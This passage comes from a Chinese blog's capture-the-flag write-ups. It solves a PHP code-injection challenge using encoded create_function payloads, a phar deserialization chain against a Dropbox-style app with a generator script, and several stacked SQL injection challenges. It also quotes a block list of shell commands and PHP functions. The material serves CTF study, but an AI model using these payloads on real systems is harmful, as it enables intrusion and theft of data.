Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123;     die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;</code></pre><p>过滤了一堆东西</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209223849475.png" alt="image-20211209223849475"></p><p>首先是这个，query_string获取的内容不会进行url解码，所以绕过这一步就只需要把传入的参数进行url编码就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224105760.png" alt="image-20211209224105760"></p><p>这里可以用换行符%0a绕过preg_match的匹配</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224139505.png" alt="image-20211209224139505"></p><p>这个由于检测的$_REQUEST，而对 $_REQUEST来说post的优先级大于get，所以要post传入和get内容相同的参数，把值改为数字就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224337739.png" alt="image-20211209224337739"></p><p>这个要用data://伪协议就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224412665.png" alt="image-20211209224412665"></p><p>常见的数组绕过</p><p>最后这也是最重要的地方</p><p>首先说一下<strong>create_function注入</strong></p><p><code>create_function()</code> 函数有两个参数 <code>$args</code> 和 <code>$code</code>，用于创建一个 lambda 样式的函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225145733.png" alt="image-20211209225145733"></p><p>但是我们可以通过对b进行操作，来实现这个函数的提前闭合，并写入我们想要的命令，然后通过注释符使语句合理</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225534763.png" alt="image-20211209225534763"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224450239.png" alt="image-20211209224450239"></p><p><code>$arg</code> 和 <code>$code</code> 变量都是可控的，因为 <code>extract()</code> 函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要 <code>extract()</code> 内的数组键名为 <code>arg</code> 和 <code>code</code>，键值为我们构造的用来注入的代码，即可实现 <code>$arg</code> 和 <code>$code</code> 的变量覆盖，导致代码注入。</p><p>再利用</p><pre class="language-none"><code class="language-none">var_dump(get_defined_vars())</code></pre><p>用来输出所有变量和值</p><pre class="language-none"><code class="language-none">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e解码内容：&#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209214827071.png" alt="image-20211209214827071"></p><p>但是看见flag在rea1fl4g里</p><p>所以要利用require包含这个文件然后再用get_defined_vars()读一遍试试</p><p>但是又过滤了.</p><p>所以试试base64编码</p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6ePOST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209215908383.png" alt="image-20211209215908383"></p><p>还是不行，尝试伪协议读源码了只能</p><p>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</p><p>采用取反绕过过滤</p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6ePOST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1&#x2F;&#x2F; preg_match() 只能匹配字符串，数组得以绕过。</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209232958132.png" alt="image-20211209232958132"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209221809797.png" alt="image-20211209221809797"></p><p><a href="https://blog.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L&#39;Amore (gem-love.com)</a></p><p>原题用异或也可以，贴个脚本先，万一以后能用到</p><pre class="language-none"><code class="language-none">#Author: piCEBDC7str_&#x3D; &#39;1flag.php&#39;str_&#x3D;list(str_)final&#x3D;&#39;&#39;for x in str_:    print(hex(~ord(x)&amp;0xff))    final+&#x3D;hex(~ord(x)&amp;0xff)print(str_)final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;)final+&#x3D;&#39;^&#39;for x in range(len(str_)):    final+&#x3D;r&#39;%ff&#39;print(final)</code></pre><p>取反脚本</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x2F;&#x2F;Author: 颖奇L&#39;Amore&#x2F;&#x2F;Blog: www.gem-love.com$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;$arr1 &#x3D; explode(&#39; &#39;, $a);echo &quot;&lt;br&gt;~(&quot;;foreach ($arr1 as $key &#x3D;&gt; $value) &#123;echo &quot;%&quot;.bin2hex(~$value);&#125;echo &quot;)&lt;br&gt;&quot;;</code></pre><p>用羽师傅那个也行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209235444083.png" alt="image-20211209235444083"></p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>知识点：phar的反序列化</p><p>传个jpg文件然后下载的时候抓包有个filename，这里可以实现任意文件读取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213306758.png" alt="image-20211210213306758"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213358180.png" alt="image-20211210213358180"></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>phar反序列化利用条件：</p><p>1）phar文件要能够上传至服务器</p><p>2）要有可用的魔术方法为跳板</p><p>3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</p><p>对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。</p><p>既文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作，</p><p>我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。</p><p>本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析，</p><p>这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的，</p><p>这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173648992.png" alt="image-20220206173648992"></p><p>接下来的__destruct__函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct__，则会输出该用户目录下的文件信息），</p><p>User对象的__destruct()方法，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173602900.png" alt="image-20220206173602900"></p><p>无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个&#39;close&#39;与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList-&gt;close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result。</p><p>反序列化脚本</p><pre class="language-none"><code class="language-none">&lt;?php    class User &#123;        public $db;    &#125;     class File&#123;        public $filename;        public function __construct($name)&#123;            $this-&gt;filename&#x3D;$name;        &#125;    &#125;    class FileList &#123;        private $files;        public function __construct()&#123;            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));        &#125;    &#125;     $o &#x3D; new User();    $o-&gt;db &#x3D;new FileList();    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);    $phar-&gt;setMetadata($o);    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);     $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210220146818.png" alt="image-20211210220146818"></p><p>参考文章</p><p><a href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql题wp</title>
      <link href="/2021/06/16/buu-sql%E9%A2%98wp/"/>
      <url>/2021/06/16/buu-sql%E9%A2%98wp/</url>
      
        <content type="html"><![CDATA[<p> sql好难.jpg</p> <span id="more"></span><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/123/image-20210615120304661.png" alt="image-20210615120304661"></p><p>用户框里输入单引号出现报错，猜测为字符型注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/123/image-20210615121140407.png" alt="image-20210615121140407"></p><p>利用1&#39;or 1#注入得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615121210956.png" alt="image-20210615121210956"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>先试一下万能密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615214551313.png" alt="image-20210615214551313"></p><p>利用1‘ order by 可以试出该表中存在两个字段</p><p>接下来要用堆叠查询（利用分号执行多个sql语句）</p><p>尝试先查询数据库</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615214516623.png" alt="image-20210615214516623"></p><p>成功。</p><p>再查询表名</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615214901418.png" alt="image-20210615214901418"></p><p>看到有两个表，查询两个表中的字段</p><p>words表内存在两个字段</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615215132406.png" alt="image-20210615215132406"></p><p>1919810931114514表内存在一个字段，flag在该表内。</p><p>（查询该表时表名要在反单引号内）</p><p>1&#39;;show columns from <code>1919810931114514</code>#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615215232514.png" alt="image-20210615215232514"></p><p>所以可以猜测</p><p>内部查询语句类似 : select id, data from words where id =</p><p>所以要把words表改为word1，将flag所在的表表名改为words，然后将flag改名为id；</p><p>payload：1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words; alert table words change flag id varchar(100);# </p><p>再用1’ or 1#注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615232041458.png" alt="image-20210615232041458"></p><p>也可以把words表改为words，将flag所在的表表名改为words，再为其添加id列，并将flag改为data</p><p>payload：1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# </p><p>再将1提交可直接获得flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615232008605.png" alt="image-20210615232008605"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入后输入1有回显</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617020541195.png" alt="image-20210617020541195"></p><p>输入1‘无回显猜测是数字型注入</p><p>用堆叠注入的方式</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617020708317.png" alt="image-20210617020708317"></p><p>查到存在一个flag表，尝试查看里面的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617020823449.png" alt="image-20210617020823449"></p><p>大概是被过滤了，只好百度搜wp了</p><p>看到dalao能够猜出后端语句为select &quot;.$</p><p>post[&#39;query&#39;].&quot;||flag from Flag</p><p>（搜到一篇wp说原环境中存在源码泄露，所以能够知道这部分的sql语言，但是buu的环境里没有 <a href="https://blog.csdn.net/weixin_44037296/article/details/105190639?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SUCTF 2019] EasySQL_Senimo-CSDN博客</a></p><p><strong>解法一</strong>：输入*,1</p><p>由于||在MySQL中起或的作用，因此1||flag会返回1，也就变成了</p><p>select *,1 from Flag.</p><p>成功找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617021123869.png" alt="image-20210617021123869"></p><p>如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，结果看图，第一列是数据库中的数据，第二列是添加的临时列1</p><p>因此在查询的flag后还有一个值为1的临时列</p><p><strong>解法二</strong></p><p>把&quot;||&quot;变成字符串连接符，而不是或。这里涉及到mysql中sql_mode参数设置，设置<code>sql_mode=pipes_as_concat</code>字符就可以设置。</p><p>payload：1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617021450142.png" alt="image-20210617021450142"></p><p>也能获得flag。</p><p>这是查询语句相当于select 1flag from Flag</p><p>(不太懂为啥这样也能查出来，1flag是列名如果Flag表里没有这一列呢？？)</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>用到了联合查询</p><p><a href="https://www.cnblogs.com/guoqingsentou/p/13488796.html">原理篇——sql注入2：联合查询注入 - 这太秃然了 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959">SQL注入之联合查询注入_selecthch的博客-CSDN博客_联合注入</a></p><p>参考一下</p><p>常规步骤</p><p>　            1. 判断注入点</p><p>　　　　2. 判断注入类型（数字型型or字符型）</p><p>　　　　3. 判断字段数</p><p>　　　　4. 判断回显位</p><p>　　　　5. 确定数据库名</p><p>　　　　6. 确定表名</p><p>　　　　7. 确定字段名</p><p>　　　　8. 拿到数据</p><p>1.判断注入点</p><p>​            